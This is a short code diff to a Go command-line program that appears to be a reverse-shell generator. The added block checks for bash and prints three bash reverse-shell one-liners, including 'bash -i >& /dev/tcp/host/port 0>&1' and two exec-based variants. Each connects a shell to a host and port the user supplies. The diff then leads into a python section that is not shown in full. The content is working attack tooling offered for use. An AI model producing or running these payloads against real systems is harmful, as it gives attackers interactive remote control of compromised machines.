@@ -28,6 +28,22 @@ func main() {
 	fmt.Println("port:", port)
 	// fmt.Println("tail:", flag.Args())
 
+	if isCommandAvailable("bash", "-v") {
+		fmt.Printf(Yellow, "\n[bash]\n\n")
+
+		bash1 := fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port)
+		fmt.Printf(Italic, "Bash 1\n")
+		fmt.Println(bash1 + "\n")
+
+		bash2 := fmt.Sprintf("0<&196;exec 196<>/dev/tcp/%s/%d; sh <&196 >&196 2>&196", host, port)
+		fmt.Printf(Italic, "Bash 2\n")
+		fmt.Println(bash2 + "\n")
+
+		bash3 := fmt.Sprintf("exec 5<>/dev/tcp/%s/%d | cat <&5 | while read line; do $line 2>&5 >&5; done", host, port)
+		fmt.Printf(Italic, "Bash 3\n")
+		fmt.Println(bash3 + "\n")
+	}
+
 	if isCommandAvailable("python", "-v") {
 		fmt.Printf(Yellow, "\n[python]\n\n")
 
